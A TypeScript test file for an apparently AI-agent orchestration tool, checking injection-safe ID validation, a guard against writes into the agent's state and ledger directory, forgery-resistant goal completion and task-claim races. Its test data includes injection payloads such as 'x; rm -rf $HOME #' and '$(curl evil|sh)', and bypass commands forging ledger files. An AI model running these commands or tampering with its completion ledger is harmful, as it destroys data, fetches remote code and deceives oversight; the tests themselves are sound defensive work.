/**
 * Tier-0 fix tests: safe-id validation, dot-dir write guard, disk re-validated
 * completion, and the O_EXCL claim lease race. These cover the security +
 * integrity fixes that the pure-logic tests missed.
 * Run: bun test
 */
import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import * as path from "node:path";
import { StateWriter } from "../state/index.ts";
import { guardsDotDirBash, guardsDotDirWrite } from "../workflow/gates.ts";
import {
	type EvidenceItem,
	type GoalsState,
	type LedgerEvent,
	receiptContentSha256,
	verifyCompletionFromDisk,
} from "../workflow/goals.ts";
import { TeamCoordinator } from "./coordination.ts";
import { assertSafeId, assertSafeModel, isSafeId, isSafeModel, shellQuote } from "./ids.ts";

describe("safe-id validation (injection defense CR4)", () => {
	test("accepts normal ids", () => {
		expect(isSafeId("skeptic")).toBe(true);
		expect(isSafeId("worker-1")).toBe(true);
		expect(isSafeId("a.b:c")).toBe(true);
	});

	test("rejects shell/python/path injection payloads", () => {
		expect(isSafeId("x; rm -rf $HOME #")).toBe(false);
		expect(isSafeId("+__import__('os')+")).toBe(false);
		expect(isSafeId("../../etc/passwd")).toBe(false);
		expect(isSafeId("a/b")).toBe(false);
		expect(isSafeId("a\\b")).toBe(false);
		expect(isSafeId("$(curl evil|sh)")).toBe(false);
		expect(isSafeId("")).toBe(false);
	});

	test("assertSafeId throws on bad input", () => {
		expect(() => assertSafeId("worker_id", "x; rm -rf /")).toThrow();
	});

	test("model validation allows provider/name, rejects injection", () => {
		expect(isSafeModel("relay/claude-sonnet-4.5")).toBe(true);
		expect(isSafeModel("relay/gpt-5.1-codex")).toBe(true);
		expect(isSafeModel("x; rm -rf $HOME")).toBe(false);
		expect(isSafeModel("relay/../../x")).toBe(false);
		expect(() => assertSafeModel("$(evil)")).toThrow();
	});

	test("shellQuote escapes single quotes", () => {
		expect(shellQuote("a'b")).toBe("'a'\\''b'");
	});
});

describe("dot-dir write guard (CR7)", () => {
	const root = "/tmp/proj/.tokyo";
	const sep = "/";
	test("blocks write into the state dir", () => {
		expect(guardsDotDirWrite("write", "/tmp/proj/.tokyo/ledger/goals.json", root, sep).block).toBe(true);
		expect(guardsDotDirWrite("edit", "/tmp/proj/.tokyo/plans/plan-x.md", root, sep).block).toBe(true);
		expect(guardsDotDirWrite("write", root, root, sep).block).toBe(true);
	});
	test("allows writes outside the state dir", () => {
		expect(guardsDotDirWrite("write", "/tmp/proj/src/index.ts", root, sep).block).toBe(false);
		expect(guardsDotDirWrite("write", "/tmp/proj/.tokyofake/x", root, sep).block).toBe(false);
	});
	test("ignores non-mutating tools", () => {
		expect(guardsDotDirWrite("read", "/tmp/proj/.tokyo/goals.json", root, sep).block).toBe(false);
		expect(guardsDotDirWrite("bash", "/tmp/proj/.tokyo/goals.json", root, sep).block).toBe(false);
	});
});

describe("dot-dir bash guard (CR7 bash bypass)", () => {
	test("blocks shell redirects into the dot-dir", () => {
		expect(guardsDotDirBash("bash", "printf x > .tokyo/ledger/goals.json", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "echo forged >> .tokyo/ledger/events.jsonl", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "cat x | tee .tokyo/state/audit.jsonl", ".tokyo").block).toBe(true);
	});
	test("blocks mutating commands naming the dot-dir", () => {
		expect(guardsDotDirBash("bash", "rm -rf .tokyo/ledger", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "sed -i s/a/b/ .tokyo/ledger/goals.json", ".tokyo").block).toBe(true);
	});
	test("allows reading the dot-dir", () => {
		expect(guardsDotDirBash("bash", "cat .tokyo/ledger/goals.json", ".tokyo").block).toBe(false);
		expect(guardsDotDirBash("bash", "grep foo .tokyo/state/audit.jsonl", ".tokyo").block).toBe(false);
		expect(guardsDotDirBash("bash", "ls .tokyo", ".tokyo").block).toBe(false);
	});
	test("ignores commands that don't touch the dot-dir", () => {
		expect(guardsDotDirBash("bash", "echo hi > out.txt", ".tokyo").block).toBe(false);
		expect(guardsDotDirBash("bash", "npm test", ".tokyo").block).toBe(false);
	});
	test("blocks the hardened bypass classes (best-effort)", () => {
		expect(guardsDotDirBash("bash", "cd .tokyo && printf x > ledger/goals.json", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "printf x >| .tokyo/ledger/goals.json", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "python3 -c \"open('.tokyo/ledger/goals.json','w')\"", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "node -e \"require('fs').writeFileSync('.tokyo/x','y')\"", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "D=.tokyo; printf x > $D/goals.json", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "rsync /tmp/f .tokyo/ledger/goals.json", ".tokyo").block).toBe(true);
		expect(guardsDotDirBash("bash", "tar -xf a.tar -C .tokyo/", ".tokyo").block).toBe(true);
	});
	test("still allows reads after hardening (no false positives)", () => {
		expect(guardsDotDirBash("bash", "cat .tokyo/ledger/goals.json", ".tokyo").block).toBe(false);
		expect(guardsDotDirBash("bash", "cd .tokyo && cat ledger/goals.json", ".tokyo").block).toBe(false);
		expect(guardsDotDirBash("bash", "grep verified .tokyo/ledger/events.jsonl", ".tokyo").block).toBe(false);
	});
});

describe("disk-revalidated completion (CR1/CR2)", () => {
	const evidence: EvidenceItem[] = [{ kind: "command", status: "passed", detail: "bun test" }];
	const hash = receiptContentSha256("g1", "obj g1", evidence);
	const goals: GoalsState = {
		goals: [{ id: "g1", objective: "obj g1", status: "complete", created_at: "t", updated_at: "t", receipt_sha256: hash }],
		current_goal_id: null,
	};

	test("accepts when goal + matching ledger event + recomputed hash all agree", () => {
		const events: LedgerEvent[] = [
			{ ts: "t", type: "goal_checkpointed", eventId: "e1", status: "complete", goal_id: "g1", receipt_sha256: hash, evidence },
		];
		expect(verifyCompletionFromDisk("g1", goals, events).ok).toBe(true);
	});

	test("rejects when no matching ledger event exists (write-only ledger forgery)", () => {
		expect(verifyCompletionFromDisk("g1", goals, []).ok).toBe(false);
	});

	test("rejects a forged goals.json hash with no backing evidence", () => {
		// goal claims a hash, but the ledger event's evidence recomputes to a different hash
		const events: LedgerEvent[] = [
			{ ts: "t", type: "goal_checkpointed", eventId: "e1", status: "complete", goal_id: "g1", receipt_sha256: hash, evidence: [{ kind: "command", status: "passed", detail: "DIFFERENT" }] },
		];
		expect(verifyCompletionFromDisk("g1", goals, events).ok).toBe(false);
	});

	test("rejects when the ledger event lacks an eventId binding", () => {
		const events: LedgerEvent[] = [
			{ ts: "t", type: "goal_checkpointed", status: "complete", goal_id: "g1", receipt_sha256: hash, evidence },
		];
		expect(verifyCompletionFromDisk("g1", goals, events).ok).toBe(false);
	});
});

describe("O_EXCL claim lease race (H1)", () => {
	let root: string;
	beforeEach(() => {
		root = mkdtempSync(path.join(tmpdir(), "tokyo-team-"));
	});
	afterEach(() => {
		rmSync(root, { recursive: true, force: true });
	});

	test("only ONE of N concurrent claims on the same task wins", async () => {
		const s = new StateWriter(root, ".tokyo");
		const co = new TeamCoordinator(s, "t1");
		await co.create([
			{ id: "w1" },
			{ id: "w2" },
			{ id: "w3" },
			{ id: "w4" },
		]);
		const task = await co.createTask({ objective: "do it" });
		const workers = ["w1", "w2", "w3", "w4"].map((id) => ({ id, status: "busy", last_heartbeat: Date.now() }));
		const results = await Promise.all(workers.map((w) => co.claimTask(task.id, w)));
		const winners = results.filter((r) => r.ok);
		expect(winners.length).toBe(1);
	});

	test("a leased task requires its claim token to transition", async () => {
		const s = new StateWriter(root, ".tokyo");
		const co = new TeamCoordinator(s, "t2");
		await co.create([{ id: "w1" }]);
		const task = await co.createTask({ objective: "x" });
		const claim = await co.claimTask(task.id, { id: "w1", status: "busy", last_heartbeat: Date.now() });
		expect(claim.ok).toBe(true);
		// without the token: refused (ownership enforced)
		const noTok = await co.transitionTask(task.id, "complete", [{ kind: "command", status: "passed", detail: "ok" }]);
		expect(noTok.ok).toBe(false);
		// with the token: accepted
		const leased = (await co.listTasks()).find((t) => t.id === task.id);
		const done = await co.transitionTask(task.id, "complete", [{ kind: "command", status: "passed", detail: "ok" }], leased?.claim_token ?? undefined);
		expect(done.ok).toBe(true);
	});

	test("transition with a wrong claim token is rejected", async () => {
		const s = new StateWriter(root, ".tokyo");
		const co = new TeamCoordinator(s, "t3");
		await co.create([{ id: "w1" }]);
		const task = await co.createTask({ objective: "x" });
		await co.claimTask(task.id, { id: "w1", status: "busy", last_heartbeat: Date.now() });
		const r = await co.transitionTask(task.id, "in_progress", undefined, "wrong-token");
		expect(r.ok).toBe(false);
		if (!r.ok) expect(r.reason).toContain("token");
	});
});
